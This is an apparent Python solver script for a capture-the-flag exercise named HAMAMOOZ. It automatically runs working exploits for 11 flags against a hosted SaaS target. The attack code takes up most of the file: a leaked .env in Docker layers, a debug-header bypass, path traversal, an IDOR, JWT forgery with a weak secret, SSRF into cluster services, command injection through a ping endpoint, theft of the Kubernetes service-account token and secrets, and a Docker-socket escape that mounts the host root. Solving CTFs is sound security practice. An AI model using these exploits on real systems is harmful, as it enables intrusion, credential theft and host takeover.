#!/usr/bin/env python3
"""
HAMAMOOZ CTF ("Break the SaaS") — automated PoC runner.

Runs a reproducible proof-of-concept for each of the 11 flags and prints
whatever flag value each one returns. No flag values or live credentials
are hardcoded here — flags 5/6 need a JWT you obtain yourself (via
--token or the JWT_TOKEN env var) since they require an authenticated
session; everything else is fully self-contained.

Usage:
    python3 extract.py                       # run everything
    python3 extract.py --token "$JWT"        # needed for flags 5 and 6
    python3 extract.py --skip 1              # skip the (slow) Docker step
    python3 extract.py --skip 1 5 6          # skip several

Requirements: requests, PyJWT (`pip install requests pyjwt`), plus a local
`docker` and `tar` for flag 1.
"""

import argparse
import base64
import json
import os
import re
import shutil
import subprocess
import tarfile
from pathlib import Path

import requests

FLAG_RE = re.compile(r"HAMAMOOZ\{[^}]+\}")
DEFAULT_BASE = "https://ctf.seoeh.ir"
DEFAULT_IMAGE = "hub.hamdocker.ir/seoeh/hamamooz_challlenges:backend"


def find_flag(text) -> str | None:
    if not text:
        return None
    m = FLAG_RE.search(str(text))
    return m.group(0) if m else None


def b64(s: str) -> str:
    return base64.b64encode(s.encode()).decode()


class Runner:
    def __init__(self, base_url: str, token: str | None):
        self.base = base_url.rstrip("/")
        self.token = token
        self.session = requests.Session()
        self.session.headers["User-Agent"] = "hamamooz-ctf-poc/1.0"

    # -- shared transport: the command-injection foothold (flag 9) ----------
    def diag(self, shell_command: str) -> str:
        """
        Runs an arbitrary shell command inside the backend pod via the
        vulnerable /api/diag/ping endpoint (flag 9's own vulnerability).
        Piping through base64 avoids all quoting headaches with nested
        JSON / shell / kubectl-exec layers.
        """
        encoded = b64(shell_command)
        payload = {"host": f"127.0.0.1; echo {encoded} | base64 -d | sh"}
        try:
            r = self.session.post(
                f"{self.base}/api/diag/ping", json=payload, timeout=25
            )
            return r.json().get("output", "")
        except Exception as e:
            return f"[diag error: {e}]"

    # ------------------------------------------------------------------ F1
    def flag1(self, image: str, workdir: str) -> str | None:
        if not shutil.which("docker"):
            print("    [-] docker not found, skipping")
            return None

        wd = Path(workdir)
        wd.mkdir(exist_ok=True)
        tarball = wd / "image.tar"
        extracted = wd / "extracted"

        try:
            subprocess.run(["docker", "pull", image], check=True)
            subprocess.run(
                ["docker", "save", image, "-o", str(tarball)], check=True
            )
            extracted.mkdir(exist_ok=True)
            subprocess.run(
                ["tar", "-xf", str(tarball), "-C", str(extracted)], check=True
            )
        except subprocess.CalledProcessError as e:
            print(f"    [-] docker/tar failed: {e}")
            return None

        blobs_dir = extracted / "blobs" / "sha256"
        if not blobs_dir.exists():
            print("    [-] unexpected image layout")
            return None

        # Don't hardcode a specific layer digest (it changes if the image
        # is rebuilt) — search every layer blob for the leaked file.
        for blob in blobs_dir.iterdir():
            try:
                with tarfile.open(blob) as tf:
                    if "app/.env" in tf.getnames():
                        content = tf.extractfile("app/.env").read().decode(
                            "utf-8", errors="replace"
                        )
                        flag = find_flag(content)
                        if flag:
                            return flag
            except tarfile.ReadError:
                continue

        print("    [-] app/.env not found in any layer")
        return None

    # ------------------------------------------------------------------ F2
    def flag2(self) -> str | None:
        r = self.session.get(f"{self.base}/swagger.json", timeout=15)
        try:
            desc = r.json()["info"]["description"]
        except Exception:
            desc = r.text
        return find_flag(desc)

    # ------------------------------------------------------------------ F3
    def flag3(self) -> str | None:
        r = self.session.get(
            f"{self.base}/api/internal/flag",
            headers={"X-Debug-Mode": "true"},
            timeout=15,
        )
        return find_flag(r.text)

    # ------------------------------------------------------------------ F4
    def flag4(self) -> str | None:
        r = self.session.get(
            f"{self.base}/api/reports/download",
            params={"file": "../flag.txt"},
            timeout=15,
        )
        return find_flag(r.text)

    # ------------------------------------------------------------------ F5
    def flag5(self) -> str | None:
        if not self.token:
            print("    [-] no --token supplied, skipping")
            return None
        r = self.session.get(
            f"{self.base}/api/orgs/2/reports/2",
            headers={"Authorization": f"Bearer {self.token}"},
            timeout=15,
        )
        try:
            return find_flag(r.json().get("secret_note", ""))
        except Exception:
            return find_flag(r.text)

    # ------------------------------------------------------------------ F6
    def flag6(self) -> str | None:
        if not self.token:
            print("    [-] no --token supplied, skipping")
            return None
        try:
            import jwt
        except ImportError:
            print("    [-] PyJWT not installed (`pip install pyjwt`)")
            return None

        payload = jwt.decode(self.token, options={"verify_signature": False})
        payload["role"] = "admin"
        forged = jwt.encode(payload, "changeme123", algorithm="HS256")

        r = self.session.get(
            f"{self.base}/admin/dashboard",
            headers={"Authorization": f"Bearer {forged}"},
            timeout=15,
        )
        try:
            return find_flag(r.json().get("flag", ""))
        except Exception:
            return find_flag(r.text)

    # ------------------------------------------------------------------ F7
    def flag7(self) -> str | None:
        r = self.session.post(
            f"{self.base}/api/webhooks/test",
            json={
                "url": "http://admin-panel.internal-tools.svc.cluster.local/",
                "method": "GET",
            },
            timeout=40,
        )
        return find_flag(r.text)

    # ------------------------------------------------------------------ F8
    def flag8(self) -> str | None:
        inner = (
            'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); '
            'curl -sk -H "Authorization: Bearer $TOKEN" '
            'https://kubernetes.default.svc/api/v1/namespaces/ctf-secrets/secrets'
        )
        output = self.diag(inner)
        m = re.search(r'"flag"\s*:\s*"([^"]+)"', output)
        if not m:
            return find_flag(output)
        try:
            decoded = base64.b64decode(m.group(1)).decode("utf-8", errors="replace")
        except Exception:
            return None
        return find_flag(decoded)

    # ------------------------------------------------------------------ F9
    def flag9(self) -> str | None:
        output = self.diag("cat /opt/.sysdiag-7e3f9a2c4b1d8e5f/flag.txt")
        return find_flag(output)

    # ----------------------------------------------------------------- F10
    def flag10(self) -> str | None:
        inner = (
            'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); '
            'kubectl --server=https://kubernetes.default.svc --token=$TOKEN '
            '--certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt '
            'exec -n escape-zone legacy-worker -- cat /host/var/lib/node-data/flag.txt'
        )
        return find_flag(self.diag(inner))

    # ----------------------------------------------------------------- F11
    def flag11(self) -> str | None:
        """
        Docker-socket-mount escape to the real host VM. This is
        intentionally the most conservative step: it creates a
        short-lived container that only cats the flag and exits, then
        we clean it up. It does NOT modify authorized_keys or persist
        anything, since this runs against a shared environment.
        """
        kubectl_exec = "kubectl exec -n escape-zone legacy-worker -- "
        sock = "/host/run/docker.sock"

        create_payload = json.dumps(
            {
                "Image": "ctf/escape-zone:latest",
                "Cmd": ["sh", "-c", "cat /hostroot/home/ubuntu/flag.txt"],
                "HostConfig": {"Binds": ["/:/hostroot"]},
            }
        )
        create_cmd = (
            f"{kubectl_exec}curl -s --unix-socket {sock} -X POST "
            f'http://localhost/containers/create -H "Content-Type: application/json" '
            f"-d '{create_payload}'"
        )
        create_out = self.diag(create_cmd)
        try:
            container_id = json.loads(create_out)["Id"]
        except Exception:
            print(f"    [-] container create failed: {create_out[:300]}")
            return None

        try:
            self.diag(
                f"{kubectl_exec}curl -s --unix-socket {sock} -X POST "
                f"http://localhost/containers/{container_id}/start"
            )
            logs = self.diag(
                f"{kubectl_exec}curl -s --unix-socket {sock} "
                f'"http://localhost/containers/{container_id}/logs?stdout=1&stderr=1"'
            )
            return find_flag(logs)
        finally:
            # always try to clean up the container we created
            self.diag(
                f"{kubectl_exec}curl -s --unix-socket {sock} -X DELETE "
                f"http://localhost/containers/{container_id}?force=1"
            )


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--url", default=DEFAULT_BASE)
    ap.add_argument("--token", default=os.environ.get("JWT_TOKEN"))
    ap.add_argument("--image", default=DEFAULT_IMAGE)
    ap.add_argument("--workdir", default="ctf_work")
    ap.add_argument(
        "--skip", nargs="*", type=int, default=[], help="flag numbers to skip"
    )
    args = ap.parse_args()

    runner = Runner(args.url, args.token)
    steps = {
        1: lambda: runner.flag1(args.image, args.workdir),
        2: runner.flag2,
        3: runner.flag3,
        4: runner.flag4,
        5: runner.flag5,
        6: runner.flag6,
        7: runner.flag7,
        8: runner.flag8,
        9: runner.flag9,
        10: runner.flag10,
        11: runner.flag11,
    }

    print(f"Target: {args.url}\n")
    results = {}
    for n in range(1, 12):
        if n in args.skip:
            print(f"[Flag {n:2}] skipped")
            continue
        print(f"[Flag {n:2}] running...")
        try:
            results[n] = steps[n]()
        except Exception as e:
            print(f"    [!] raised {type(e).__name__}: {e}")
            results[n] = None
        status = results[n] or "not found"
        print(f"[Flag {n:2}] {status}\n")

    print("=" * 40)
    print("SUMMARY")
    print("=" * 40)
    found = sum(1 for v in results.values() if v)
    for n in range(1, 12):
        print(f"Flag {n:2}: {results.get(n) or 'not found / skipped'}")
    print(f"\n{found}/11 flags found")


if __name__ == "__main__":
    main()